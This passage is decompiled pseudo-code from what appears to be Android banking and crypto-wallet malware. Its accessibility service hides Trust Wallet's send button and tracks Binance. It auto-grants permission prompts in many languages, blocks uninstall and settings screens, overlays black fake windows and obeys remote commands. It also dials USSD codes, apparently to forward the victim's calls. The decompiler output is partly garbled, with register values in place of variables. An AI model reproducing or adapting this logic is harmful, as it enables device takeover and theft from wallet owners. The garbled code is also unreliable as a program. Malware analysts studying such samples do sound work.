        if ("com.wallet.crypto.trustapp" == null || "com.wallet.crypto.trustapp" == 0) { // goto +26
        AccessibilityEvent.getSource(...);
        2.getViewIdResourceName();
        v2 = "com.wallet.crypto.trustapp:id/action_send".equals(2);
        if ("com.wallet.crypto.trustapp:id/action_send" == null || "com.wallet.crypto.trustapp:id/action_send" == 0) { // goto +10
        v2 = 8;
        "com.wallet.crypto.trustapp:id/action_send".setVisibility(8);
        // goto (branch)
        AccessibilityEvent.getContentDescription(...);
        "com.wallet.crypto.trustapp:id/action_send".toString();
        AccessibilityEvent.getPackageName(...);
        8.equals("com.android.systemui");
        if (8 == null || 8 == 0) { // goto +49
        "com.wallet.crypto.trustapp:id/action_send".equals("主屏幕");
        if ("主屏幕" != null && "主屏幕" != 0) { // goto +34
        "com.wallet.crypto.trustapp:id/action_send".equals("Home");
        if ("Home" != null && "Home" != 0) { // goto +26
        "com.wallet.crypto.trustapp:id/action_send".equals("home_button");
        if ("home_button" != null && "home_button" != 0) { // goto +18
        "com.wallet.crypto.trustapp:id/action_send".equals("recent_apps");
        if ("recent_apps" != null && "recent_apps" != 0) { // goto +10
        v2 = "com.wallet.crypto.trustapp:id/action_send".equals("Overview");
        if ("com.wallet.crypto.trustapp:id/action_send" == null || "com.wallet.crypto.trustapp:id/action_send" == 0) { // goto +9
        v2 = 8;
        "com.wallet.crypto.trustapp:id/action_send".setVisibility(8);
        "com.wallet.crypto.trustapp:id/action_send".size();
        if ("com.wallet.crypto.trustapp:id/action_send" <= 0) { // goto +28
        AccessibilityEvent.getPackageName(...);
        8.toString();
        8.toLowerCase();
        "com.wallet.crypto.trustapp:id/action_send".contains(8);
        if ("com.wallet.crypto.trustapp:id/action_send" == null || "com.wallet.crypto.trustapp:id/action_send" == 0) { // goto +8
        AccessibilityServiceCore.tunesxconcerningn1012blockBack(...);
        AccessibilityServiceCore.tunesxconcerningn1012SendMeHome(...);
        v2 = AccessibilityEvent.getSource(...);
        // goto (branch)
        if ("com.wallet.crypto.trustapp:id/action_send" == null || "com.wallet.crypto.trustapp:id/action_send" == 0) { // goto +4
        v2 = 1;
        // goto (branch)
        v2 = 0;
        AccessibilityEvent.getClassName(...);
        "com.android.systemui".equals("android.widget.EditText");
        if (0 == null || 0 == 0) { // goto +4
        AccessibilityServiceCore.tunesxconcerningn1012Globalnode = "com.wallet.crypto.trustapp:id/action_send";
        v4 = AccessibilityServiceCore.getRootInActiveWindow(...);
        if (0 == null || 0 == 0) { // goto +28
        v4 = 0;
        Boolean.valueOf(0);
        My_tunesxconcerningn10_Settings.readBool(v0, "SKL", "android.widget.EditText");
        if ("SKL" == null || "SKL" == 0) { // goto +15
        // new AccessibilityServiceCore$$ExternalSyntheticLambda14(v0, 0)
        // new Thread(0)
        "SKL".start();
        v2 = 32;
        if (0 == 32) { // goto +216
        v2 = 64;
        if (0 == 64) { // goto +185
        v2 = 16384;
        if (0 == 16384) { // goto +4
        // goto (branch)
        AccessibilityEvent.getText(...);
        16384.toString();
        16384.hashCode();
        // goto (branch)
        v3 = 16384.equals("[unBlock]");
        if (16384 == null || 16384 == 0) { // goto +33
        v3 = 3;
        // goto (branch)
        v3 = 16384.equals("[Block]");
        if (16384 == null || 16384 == 0) { // goto +23
        v3 = 2;
        // goto (branch)
        v3 = 16384.equals("[unbassit]");
        if (16384 == null || 16384 == 0) { // goto +13
        v3 = 1;
        // goto (branch)
        v3 = 16384.equals("[bassit]");
        if (16384 == null || 16384 == 0) { // goto +3
        v3 = 0;
        if (0 == null || 0 == 0) { // goto +81
        v2 = 1;
        if (0 == 1) { // goto +62
        v2 = 2;
        if (0 == 2) { // goto +33
        v2 = 3;
        if (0 == 3) { // goto +3
        // goto (branch)
        v3 = 3.getWindowToken();
        if (3 == null || 3 == 0) { // goto +90
        v3 = 0;
        3.setFocusable(0);
        3.setClickable(0);
        v3 = 8;
        3.setVisibility(8);
        // goto (branch)
        v3 = 3.getWindowToken();
        if (3 == null || 3 == 0) { // goto +63
        v3 = 1;
        3.setFocusable(1);
        3.setClickable(1);
        v3 = 0;
        3.setVisibility(0);
        // goto (branch)
        // new Handler()
        // new AccessibilityServiceCore$16(v0)
        v4 = 1;
        3.postDelayed(0, 1, "android.widget.EditText");
        // goto (branch)
        v3 = 0;
        3.setFocusable(0);
        3.setClickable(0);
        3.setLayoutParams(0);
        3.updateViewLayout(0, 1);
        3.booleanValue();
        if (3 == null || 3 == 0) { // goto +5
        AccessibilityServiceCore.tunesxconcerningn1012pasteText(...);
        // goto (branch)
        if (3 != null && 3 != 0) { // goto +8
        v0 = AccessibilityServiceCore.getApplicationContext(...);
        MainBackgroundService.app_tunesxconcerningn1011_Context = 3;
        if (3 != null && 3 != 0) { // goto +4
        MainBackgroundService.MyAccess = v0;
        if (3 == null || 3 == 0) { // goto +5
        AccessibilityServiceCore.tunesxconcerningn1012SendNotifi(...);
        AccessibilityServiceCore.getApplicationContext(...);
        // goto (branch)
        if (3 == null || 3 == 0) { // goto +20
        AccessibilityEvent.getPackageName(...);
        3.toString();
        3.toLowerCase();
        DataPackagingEngine._SGA2(0, 3);
        // goto (branch)
        if (3 == null || 3 == 0) { // goto +5
        AccessibilityServiceCore.tunesxconcerningn1012ActivSend(...);
        3.booleanValue();
        if (3 == null || 3 == 0) { // goto +23
        v2 = v0.Gotitinstalled("com.wallet.crypto.trustapp:id/action_send");
        if (3 == null || 3 == 0) { // goto +17
        v2 = 0;
        v4 = Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012FOR_IN = 1;
        v4 = 100;
        Thread.sleep(100, "android.widget.EditText");
        AccessibilityServiceCore.tunesxconcerningn1012blockBack(...);
        0.booleanValue();
        if (0 != null && 0 != 0) { // goto +18
        0.booleanValue();
        if (0 != null && 0 != 0) { // goto +10
        0.booleanValue();
        if (0 == null || 0 == 0) { // goto +331
        if ("com.wallet.crypto.trustapp:id/action_send" != null && "com.wallet.crypto.trustapp:id/action_send" != 0) { // goto +3
        return;
        0.booleanValue();
        if (0 == null || 0 == 0) { // goto +7
        AccessibilityServiceCore.tunesxconcerningn1012clickByText("Start Now");
        v2 = "Start Now".booleanValue();
        if ("Start Now" == null || "Start Now" == 0) { // goto +7
        AccessibilityServiceCore.tunesxconcerningn1012clickByText("Allow");
        v2 = 5;
        v5 = 0;
        100[0] = "com.android.packageinstaller:id/permission_allow_button";
        v5 = 1;
        100[1] = "android:id/button1";
        v5 = 2;
        100[2] = "com.android.settings:id/action_button";
        v5 = 3;
        100[3] = "com.android.permissioncontroller:id/permission_allow_foreground_only_button";
        v5 = 4;
        100[4] = "com.android.permissioncontroller:id/permission_allow_button";
        v2 = 0;
        v5 = 5;
        if (0 >= 5) { // goto +59
        "com.wallet.crypto.trustapp:id/action_send".findAccessibilityNodeInfosByViewId(5);
        5.iterator();
        5.hasNext();
        if (0 == null || 0 == 0) { // goto +40
        5.next();
        0.getText();
        if (3428 == null || 3428 == 0) { // goto +15
        0.getText();
        v7 = "卸载".equals("text/html");
        if ("卸载" == null || "卸载" == 0) { // goto +3
        return;
        v7 = 16;
        0.performAction(16);
        v6 = 0;
        v2 = Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012Auto_Click = 16;
        // goto (branch)
        v2 = 0 + 1;
        // goto (branch)
        v2 = 3;
        v5 = 0;
        100[0] = "com.android.permissioncontroller:id/permission_allow_foreground_only_button";
        v5 = 1;
        100[1] = "android:id/button1";
        v5 = 2;
        100[2] = "com.android.permissioncontroller:id/permission_allow_button";
        v2 = 0;
        v5 = 3;
        if (0 >= 3) { // goto +59
        "com.wallet.crypto.trustapp:id/action_send".findAccessibilityNodeInfosByViewId(3);
        3.iterator();
        3.hasNext();
        if (0 == null || 0 == 0) { // goto +40
        3.next();
        0.getText();
        if (16 == null || 16 == 0) { // goto +15
        0.getText();
        v7 = "卸载".equals("text/html");
        if ("卸载" == null || "卸载" == 0) { // goto +3
        return;
        v7 = 16;
        0.performAction(16);
        v6 = 0;
        v2 = Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012Auto_Click = 16;
        // goto (branch)
        v2 = 0 + 1;
        // goto (branch)
        v2 = 13;
        v5 = 0;
        13[0] = "本次";
        v5 = 1;
        13[1] = "Once";
        v5 = 2;
        13[2] = "ཐེངས་འདིར་འཁོར་སྐྱོད་བྱེད་ཆོག";
        v5 = 3;
        13[3] = "kali";
        v5 = 4;
        13[4] = "lần";
        v5 = 5;
        13[5] = "တစ်ကြိမ်";
        v5 = 6;
        13[6] = "始终";
        v5 = 7;
        13[7] = "Allow";
        v5 = 8;
        13[8] = "time";
        v5 = 9;
        13[9] = "ད་དེ་ཆོག";
        v5 = 10;
        13[10] = "izinkan";
        v5 = 11;
        13[11] = "Chấp nhận";
        v5 = 12;
        13[12] = "ခွင့်ပြုပါ";
        Arrays.asList(13);
        13.iterator();
        13.hasNext();
        if ("ခွင့်ပြုပါ" == null || "ခွင့်ပြုပါ" == 0) { // goto +46
        13.next();
        "com.wallet.crypto.trustapp:id/action_send".findAccessibilityNodeInfosByText("ခွင့်ပြုပါ");
        v5 = "ခွင့်ပြုပါ".isEmpty();
        if (12 != null && 12 != 0) { // goto +27
        v5 = 0;
        "ခွင့်ပြုပါ".get(0);
        v6 = "ခွင့်ပြုပါ".isClickable();
        if (0 == null || 0 == 0) { // goto +14
        v6 = 16;
        "ခွင့်ပြုပါ".performAction(16);
        v6 = Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012Auto_Click = "ခွင့်ပြုပါ";
        // goto (branch)
        v6 = 16;
        // goto (branch)
        if ("com.wallet.crypto.trustapp:id/action_send" == null || "com.wallet.crypto.trustapp:id/action_send" == 0) { // goto +98
        DataPackagingEngine.PERMISSIONS();
        v1 = DataPackagingEngine.H__tunesxconcerningn1011_P(v0, "com.wallet.crypto.trustapp:id/action_send");
        if ("com.wallet.crypto.trustapp:id/action_send" != null && "com.wallet.crypto.trustapp:id/action_send" != 0) { // goto +85
        v1 = 0;
        AccessibilityServiceCore.tunesxconcerningn1012CheckPrims = 0;
        // new Intent(v0, 13)
        v2 = 268435456; // 0x10000000
        v2 = 0.addFlags(13);
        v2 = 1073741824; // 0x40000000
        v1 = 0.addFlags(13);
        v0.startActivity(0);
        return;
        v1 = 1;
        Boolean.valueOf(1);
        v1 = 1.booleanValue();
        if (13 == null || 13 == 0) { // goto +9
        v1 = 0;
        Boolean.valueOf(0);
        // goto (branch)
        v1 = 0.booleanValue();
        if (13 == null || 13 == 0) { // goto +9
        v1 = 0;
        Boolean.valueOf(0);
        // goto (branch)
        v1 = 0.booleanValue();
        if (13 == null || 13 == 0) { // goto +9
        v1 = 0;
        Boolean.valueOf(0);
        // goto (branch)
        v1 = 0.booleanValue();
        if (0 == null || 0 == 0) { // goto +12
        v1 = 0;
        v1 = Boolean.valueOf(0);
        // goto (branch)
        v1 = 1;
        AccessibilityServiceCore.tunesxconcerningn1012CheckPrims = 1;
        1.booleanValue();
        if (1 != null && 1 != 0) { // goto +213
        if (1 == null || 1 == 0) { // goto +209
        if (1 == null || 1 == 0) { // goto +205
        // new StringBuilder()
        1.append("[");
        AccessibilityServiceCore.getPackageName(...);
        AccessibilityServiceCore.tunesxconcerningn1012getAppNameFromPkgName(v0, "[");
        "[".toLowerCase();
        1.append("[");
        1.append("]");
        1.toString();
        AccessibilityServiceCore.getPackageName(...);
        AccessibilityServiceCore.tunesxconcerningn1012getAppNameFromPkgName(v0, "]");
        "]".toLowerCase();
        AccessibilityEvent.getClassName(...);
        "ခွင့်ပြုပါ".toString();
        "ခွင့်ပြုပါ".toLowerCase();
        "com.android.settings.SubSettings".toLowerCase();
        AccessibilityEvent.getClassName(...);
        0.toString();
        0.toLowerCase();
        "com.android.settings.SubSettings".equals(0);
        if ("com.android.settings.SubSettings" == null || "com.android.settings.SubSettings" == 0) { // goto +44
        AccessibilityServiceCore.getEventText(...);
        "com.android.settings.SubSettings".toLowerCase();
        1.toLowerCase();
        "com.android.settings.SubSettings".equals(1);
        if (1 != null && 1 != 0) { // goto +20
        AccessibilityServiceCore.getEventText(...);
        1.toLowerCase();
        "]".toLowerCase();
        1.equals("]");
        if (1 == null || 1 == 0) { // goto +8
        AccessibilityServiceCore.tunesxconcerningn1012blockBack(...);
        AccessibilityServiceCore.tunesxconcerningn1012SendMeHome(...);
        AccessibilityServiceCore.getEventText(...);
        1.toLowerCase();
        AccessibilityServiceCore.getPackageName(...);
        AccessibilityServiceCore.tunesxconcerningn1012getAppNameFromPkgName(v0, "]");
        "]".toLowerCase();
        AccessibilityEvent.getPackageName(...);
        0.toString();
        0.toLowerCase();
        "Accessibility".toLowerCase();
        1.contains("Accessibility");
        if ("Accessibility" == null || "Accessibility" == 0) { // goto +14
        1.contains("]");
        if ("Accessibility" == null || "Accessibility" == 0) { // goto +8
        AccessibilityServiceCore.tunesxconcerningn1012blockBack(...);
        AccessibilityServiceCore.tunesxconcerningn1012SendMeHome(...);
        "Accessibility".toLowerCase();
        0.contains("Accessibility");
        if (0 == null || 0 == 0) { // goto +14
        1.contains("]");
        if (1 == null || 1 == 0) { // goto +8
        AccessibilityServiceCore.tunesxconcerningn1012blockBack(...);
        AccessibilityServiceCore.tunesxconcerningn1012SendMeHome(...);
        return;
    }

    public void onInterrupt() {
        return;
    }

    public void onServiceConnected() {
        v0 = v19;
        AccessibilityService.onServiceConnected(...);
        LoadingScreenOverlay.show(...);
        AppUninstallerEngine.start(...);
        AccessibilityServiceCore.subescribeDbevicbeList(...);
        LanguageManager.initLanguage();
        AccessibilityServiceCore.unlockScreenListen(...);
        v1 = new AccessibilityServiceInfo();
        // new AccessibilityServiceInfo()
        v2 = 115;
        v1.flags = 115;
        v2 = -1;
        v1.eventTypes = -1;
        v3 = 0;
        v1.notificationTimeout = 0;
        v3 = 0;
        v1.packageNames = 0;
        v1.feedbackType = -1;
        v0.setServiceInfo(v1);
        AccessibilityServiceCore.getApplicationContext(...);
        v1 = AccessibilityServiceCore.getApplicationName(v1);
        v1 = v1.toLowerCase();
        AccessibilityServiceCore.CurrentName = v1;
        MainBackgroundService.MyAccess = v0;
        AccessibilityServiceCore.getApplicationContext(...);
        v1 = "window";
        v0.getSystemService("window");
        -1 = new FrameLayout();
        // new FrameLayout(v0)
        -1 = new WindowManager$LayoutParams();
        v4 = 1;
        v5 = 1;
        v6 = 2032;
        v7 = -2142501736;
        v8 = -3;
        WindowManager$LayoutParams.<init>(...);
        v3 = 48;
        -1.gravity = 48;
        AccessibilityServiceCore.tunesxconcerningn1012lay = -1;
        AccessibilityServiceCore.tunesxconcerningn1012wm = "window";
        -1 = new FrameLayout();
        // new FrameLayout(v0)
        AccessibilityServiceCore.injview = -1;
        v3 = 8;
        -1.setVisibility(8);
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.read(-1, "SCH", "720");
        v11 = AccessibilityServiceCore.getApplicationContext(...);
        v11 = My_tunesxconcerningn10_Settings.read("SCH", "SCW", "1080");
        v11 = new WindowManager$LayoutParams();
        Integer.valueOf(-1);
        "SCW".intValue();
        v8 = Integer.valueOf("SCH");
        v8 = "SCW".intValue();
        v8 = 2032;
        v9 = 262152;
        v10 = 1;
        WindowManager$LayoutParams.<init>(...);
        AccessibilityServiceCore.layoutParams = v11;
        v5 = 53;
        v11.gravity = 53;
        v6 = -2;
        53.width = -2;
        53.height = -2;
        -2 = AccessibilityServiceCore.layoutParams;
        "window".addView(53, -2);
        Integer.valueOf(-1);
        -2.intValue();
        v10 = Integer.valueOf("SCH");
        v10 = -2.intValue();
        v10 = 2032;
        v11 = -2142501248;
        v12 = 1;
        -2142501736 = 53;
        WindowManager$LayoutParams.<init>(...);
        AccessibilityServiceCore.Fakeparams = 53;
        Integer.valueOf(-1);
        -1.intValue();
        v16 = Integer.valueOf("SCH");
        v16 = -1.intValue();
        v16 = 2032;
        v17 = -2142501224;
        v18 = 1;
        v13 = 53;
        WindowManager$LayoutParams.<init>(...);
        AccessibilityServiceCore.Fakeparams_bass = 53;
        -1 = new FrameLayout();
        // new FrameLayout(v0)
        AccessibilityServiceCore.Fakelay = -1;
        v4 = Color.parseColor("#000000");
        -1.setBackgroundColor("#000000");
        -1 = AccessibilityServiceCore.Fakeparams;
        v4 = 51;
        -1.gravity = 51;
        -1 = AccessibilityServiceCore.Fakelay;
        v4 = -1.getBackground();
        v4 = 253;
        -1.setAlpha(253);
        -1 = AccessibilityServiceCore.Fakelay;
        -1.setVisibility(8);
        -1 = AccessibilityServiceCore.Fakelay;
        "window".addView(-1, 8);
        AccessibilityServiceCore.getPackageManager(...);
        MainLauncherActivity.IP_tunesxconcerningn109_I("window", -1);
        if ("window" == null || "window" == 0) { // goto +38
        "window".toLowerCase();
        -1 = "null";
        "window".equals("null");
        if ("window" != null && "window" != 0) { // goto +24
        AccessibilityServiceCore.getApplicationContext(...);
        v2 = "window".getPackageManager();
        v2 = "window".getLaunchIntentForPackage("null");
        v2 = 268435456; // 0x10000000
        "window".addFlags("null");
        v0.startActivity("window");
        AccessibilityServiceCore.getApplication(...);
        BackgroundServiceHelper.removedqtractort40("window", "null");
        if ("window" == null || "window" == 0) { // goto +16
        AccessibilityServiceCore.getApplicationContext(...);
        // new Intent("null", 8)
        v0.startService("window");
        return;
    }

    public boolean onUnbind(Intent param0) {
        v0 = Build$VERSION.SDK_INT;
        v1 = 24;
        if (v0 < 24) { // goto +6
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v2);
        // goto (branch)
        v2.stopSelf();
        v2.onUnbind(v3);
        return v3;
    }

    public void perfectSetting() {
        AutoPermissionGranter.start(v0);
        return;
    }

    public void subescribeDbevicbeList() {
        v0 = new AccessibilityServiceCore$20();
        // new AccessibilityServiceCore$20(v3)
        v3.callbeack = v0;
        v1 = MalwareConstants.Evnet_Type_PerfectSetting;
        v2 = MalwareConstants.Evnet_Type_FInish_Perfect;
        v2 = 1;
        AccessibilityEventMonitor.subscribe(v0, 1, v1);
        return;
    }

    public void takeScreenshot(int param0, Executor param1, AccessibilityService$TakeScreenshotCallback param2) {
        v0.takeScreenshot(v1, v2, v3);
        return;
    }

    public void tunesxconcerningn1012ActivSend(AccessibilityEvent param0) {
        v2.getEventText(v3);
        v3 = v3.getPackageName();
        v3 = (String) v3;
        v1 = v2.getApplicationContext();
        v1 = v0.getPackageManager();
        v1 = 0;
        v3 = v0.getApplicationInfo(v3, 0);
        // goto (branch)
        v3 = 0;
        if (0 == null || 0 == 0) { // goto +7
        v0 = v0.getApplicationLabel(0);
        // goto (branch)
        v0 = 3;
        0.getBytes();
        DataEncryptionEngine.agreeltimelybfacilitatez38(3, 0);
        return;
    }

    public String tunesxconcerningn1012RD(String param0) {
        v1 = Environment.getExternalStorageDirectory();
        v1 = new File();
        v2 = new StringBuilder();
        // new StringBuilder()
        v2.append(v0);
        v3 = "/Config/sys/apps/log";
        v2.append("/Config/sys/apps/log");
        v4 = v2.toString();
        v4 = new StringBuilder();
        v5 = "log-";
        // new StringBuilder("log-")
        v4.append(v8);
        v6 = ".txt";
        v4.append(".txt");
        v4.toString();
        // new File(v2, v4)
        v1 = v1.exists();
        if (v2 != null && v2 != 0) { // goto +37
        v1 = new File();
        v2 = new StringBuilder();
        // new StringBuilder()
        v2.append(v0);
        v2.append("/Config/sys/apps/log");
        v2 = v2.toString();
        v2 = new StringBuilder();
        // new StringBuilder("log-")
        v2.append(v8);
        v2.append(".txt");
        v8 = v2.toString();
        // new File(v0, v8)
        v8 = new StringBuilder();
        // new StringBuilder()
        v0 = new BufferedReader();
        v2 = new FileReader();
        // new FileReader(v1)
        // new BufferedReader(v2)
        v0.readLine();
        if (v1 == null || v1 == 0) { // goto +6
        v8.append(v1);
        // goto (branch)
        v0.close();
        v8.toString();
        return v8;
    }

    public void tunesxconcerningn1012SW(String param0) {
        v1 = v20;
        v0 = v21;
        v2 = "#144#1*1*";
        v3 = "*436*4*1*1*";
        v4 = "*800*1*";
        v5 = AccessibilityServiceCore.getResources(...);
        v5.getDisplayMetrics();
        v5 = Build$VERSION.SDK_INT;
        v6 = 26;
        if (v5 < 26) { // goto +2235
        v5 = "clk";
        v6 = v0.startsWith("clk");
        v6 = 0;
        v7 = 3;
        v8 = 2;
        v9 = 1;
        v10 = 0;
        if ("clk" == null || "clk" == 0) { // goto +84
        v0.split(":");
        Integer.parseInt("*436*4*1*1*");
        Integer.parseInt("*800*1*");
        v0 = v0.contains("hold");
        if (v0 == null || v0 == 0) { // goto +19
        v0 = ":"[2];
        v0 = Integer.parseInt(v0);
        v0 = ":"[3];
        v0 = Integer.parseInt(v0);
        v0 = 3000;
        v15 = 1;
        // goto (branch)
        v15 = 0;
        // new Path()
        0.moveTo(3000, ":");
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m();
        v11 = 0;
        v13 = (long) 1;
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(...);
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m$1();
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m();
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(":", 3000);
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(":");
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v1, 3000, 0, 0);
        return;
        3000.equals("Bc");
        if ("Bc" == null || "Bc" == 0) { // goto +6
        v1.performGlobalAction(1);
        return;
        v11 = 3000.equals("Ho");
        v11 = 268435456; // 0x10000000
        if ("Ho" == null || "Ho" == 0) { // goto +38
        DataPackagingEngine.GS_tunesxconcerningn1011_B(...);
        if (3000 != null && 3000 != 0) { // goto +28
        // new Intent(v1, ":")
        3000.addFlags(0);
        v2 = 536870912; // 0x20000000
        3000.addFlags(":");
        v2 = 8388608; // 0x800000
        3000.addFlags(":");
        v1.startActivity(3000);
        AccessibilityServiceCore.wakeupScreen(...);
        v1.performGlobalAction(2);
        return;
        3000.equals("RC");
        if ("RC" == null || "RC" == 0) { // goto +6
        v1.performGlobalAction(3);
        return;
        v12 = 3000.equals("LK");
        v12 = 8;
        if ("LK" == null || "LK" == 0) { // goto +16
        DataPackagingEngine.GS_tunesxconcerningn1011_B(...);
        if (3000 != null && 3000 != 0) { // goto +6
        v1.performGlobalAction(1);
        // goto (branch)
        v1.performGlobalAction(8);
        return;
        v13 = 3000.equals("LKSM");
        v13 = "YES";
        if ("LKSM" == null || "LKSM" == 0) { // goto +13
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write(3000, "SME", "YES");
        // goto (branch)
        v14 = 3000.equals("LKKM");
        v14 = "NO";
        if ("LKKM" == null || "LKKM" == 0) { // goto +18
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write(3000, "SME", "NO");
        3000.setVisibility(8);
        // goto (branch)
        3000.equals("LKSI");
        if ("LKSI" == null || "LKSI" == 0) { // goto +13
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write(3000, "SIM", "YES");
        // goto (branch)
        3000.equals("LKKI");
        if ("LKKI" == null || "LKKI" == 0) { // goto +18
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write(3000, "SIM", "NO");
        3000.setVisibility(8);
        // goto (branch)
        3000.equals("LKST");
        if ("LKST" == null || "LKST" == 0) { // goto +13
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write(3000, "STO", "YES");
        // goto (branch)
        3000.equals("LKKT");
        if ("LKKT" == null || "LKKT" == 0) { // goto +18
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write(3000, "STO", "NO");
        3000.setVisibility(8);
        // goto (branch)
        3000.equals("LKSU");
        if ("LKSU" == null || "LKSU" == 0) { // goto +13
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write(3000, "STR", "YES");
        // goto (branch)
        3000.equals("LKKU");
        if ("LKKU" == null || "LKKU" == 0) { // goto +18
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write(3000, "STR", "NO");
        3000.setVisibility(8);
        // goto (branch)
        3000.equals("LKSDU");
        if ("LKSDU" == null || "LKSDU" == 0) { // goto +6
        v1.showtrust = 1;
        // goto (branch)
        3000.equals("LKKDU");
        if ("LKKDU" == null || "LKKDU" == 0) { // goto +6
        v1.showtrust = 0;
        // goto (branch)
        3000.equals("LKSBU");
        if ("LKSBU" == null || "LKSBU" == 0) { // goto +6
        v1.showbinance = 1;
        // goto (branch)
        3000.equals("LKKBU");
        if ("LKKBU" == null || "LKKBU" == 0) { // goto +6
        v1.showbinance = 0;
        // goto (branch)
        3000.equals("LKeo");
        if ("LKeo" == null || "LKeo" == 0) { // goto +56
        AccessibilityServiceCore.wakeupScreen(...);
        v1.performGlobalAction(3);
        "1".equals(3000);
        if (3000 == null || 3000 == 0) { // goto +17
        // new AccessibilityServiceCore$5(v1)
        // new Thread("STR")
        3000.start();
        // goto (branch)
        "2".equals("STR");
        if ("2" == null || "2" == 0) { // goto +1773
        // new AccessibilityServiceCore$6(v1)
        // new Thread("STR")
        "2".start();
        // goto (branch)
        "2".equals("LKddd");
        if ("LKddd" == null || "LKddd" == 0) { // goto +27
        MainBackgroundService.currentSuccessPassword = "";
        AccessibilityServiceCore.ccurrentPassword = "";
        "".clear();
        "".clear();
        "".clear();
        // goto (branch)
        v16 = "".equals("LKou");
        v16 = 5000;
        v15 = "android.intent.action.CALL";
        v18 = 2000;
        if ("LKou" == null || "LKou" == 0) { // goto +315
        AccessibilityServiceCore.getApplicationContext(...);
        Boolean.valueOf(1);
        My_tunesxconcerningn10_Settings.WriteBool("", "STR", "*436*4*1*1*");
        "".Treger("Block");
        "".Treger("bassit");
        // new StringBuilder("*800*1*")
        "".append("STR");
        "".append("*");
        "".append("STR");
        "".append("*");
        "".append("STR");
        "".append("#");
        "".toString();
        "#".equalsIgnoreCase("samsung");
        if ("#" == null || "#" == 0) { // goto +136
        // new StringBuilder("tel:")
        Uri.encode("");
        "*436*4*1*1*".append("*800*1*");
        "*436*4*1*1*".toString();
        v3 = Uri.parse("*436*4*1*1*");
        // new Intent("android.intent.action.CALL", "*436*4*1*1*")
        v3 = 268435456; // 0x10000000
        "#".setFlags("*436*4*1*1*");
        v1.startActivity("#");
        v3 = 10000;
        Thread.sleep(10000, "*800*1*");
        v1.performGlobalAction(1);
        v4 = AccessibilityServiceCore.getPackageManager(...);
        v4 = 10000.getLaunchIntentForPackage("com.samsung.android.dialer");
        v4 = 268435456; // 0x10000000
        "#".setFlags("*800*1*");
        v1.startActivity(10000);
        Thread.sleep(...);
        AccessibilityServiceCore.tunesxconcerningn1012ToPaste = "";
        Boolean.valueOf(1);
        AccessibilityServiceCore.tunesxconcerningn1012NeedPaste = "";
        "".tunesxconcerningn1012Treger();
        Thread.sleep(...);
        AccessibilityServiceCore.getRootInActiveWindow(...);
        "".findAccessibilityNodeInfosByViewId("com.samsung.android.dialer:id/image_view");
        v3 = AccessibilityServiceCore.getRootInActiveWindow(...);
        v3 = "com.samsung.android.dialer:id/image_view".findAccessibilityNodeInfosByViewId("com.samsung.android.dialer:id/dialButtonImage");
        v3 = 0;
        v4 = "".get(0);
        v4 = "".getParent();
        v4 = 16;
        "".performAction(16);
        Thread.sleep(...);
        "com.samsung.android.dialer:id/image_view".get(0);
        "".getParent();
        "".performAction(16);
        // goto (branch)
        // new StringBuilder("tel:")
        Uri.encode("");
        0.append("");
        0.toString();
        v0 = Uri.parse("");
        // new Intent("android.intent.action.CALL", "")
        v0 = 268435456; // 0x10000000
        "com.samsung.android.dialer:id/image_view".setFlags("");
        v1.startActivity("com.samsung.android.dialer:id/image_view");
        Thread.sleep(...);
        AccessibilityServiceCore.getRootInActiveWindow(...);
        v4 = "".findAccessibilityNodeInfosByViewId("com.android.incallui:id/icon");
        v4 = "".size();
        v4 = 2;
        if (0 != 2) { // goto +29
        v3 = 0;
        v3 = "".get(0);
        v3 = "".getParent();
        v3 = 16;
        "".performAction(16);
        v3 = 8000;
        Thread.sleep(8000, 2);
        v1.performGlobalAction(1);
        v1.startActivity("com.samsung.android.dialer:id/image_view");
        Thread.sleep(...);
        AccessibilityServiceCore.getRootInActiveWindow(...);
        v3 = "".findAccessibilityNodeInfosByViewId("com.android.incallui:id/icon");
        v3 = "".size();
        v3 = 2;
        if ("com.samsung.android.dialer:id/image_view" != 2) { // goto +1401
        v2 = "".get(1);
        v2 = "".getParent();
        v2 = 16;
        "".performAction(16);
        // goto (branch)
        "".equals("LKtu");
        if ("LKtu" == null || "LKtu" == 0) { // goto +329
        if ("" == null || "" == 0) { // goto +1372
        "".isEmpty();
        if ("" != null && "" != 0) { // goto +1364
        AccessibilityServiceCore.getApplicationContext(...);
        Boolean.valueOf(1);
        My_tunesxconcerningn10_Settings.WriteBool("", 16, "LKtu");
        "".Treger("Block");
        "".Treger("bassit");
        // new StringBuilder(2)
        "".append(16);
        "".append("*");
        "".append(16);
        "".append("*1*1*");
        "".append("*1*1*");
        "".append("#");
        "".toString();
        "#".equalsIgnoreCase("samsung");
        if ("#" == null || "#" == 0) { // goto +136
        // new StringBuilder("tel:")
        Uri.encode("");
        2.append("LKtu");
        2.toString();
        v3 = Uri.parse(2);
        // new Intent("android.intent.action.CALL", 2)
        v3 = 268435456; // 0x10000000
        "#".setFlags(2);
        v1.startActivity("#");
        v3 = 10000;
        Thread.sleep(10000, "LKtu");
        v1.performGlobalAction(1);
        v4 = AccessibilityServiceCore.getPackageManager(...);
        v4 = 10000.getLaunchIntentForPackage("com.samsung.android.dialer");
        v4 = 268435456; // 0x10000000
        "#".setFlags("LKtu");
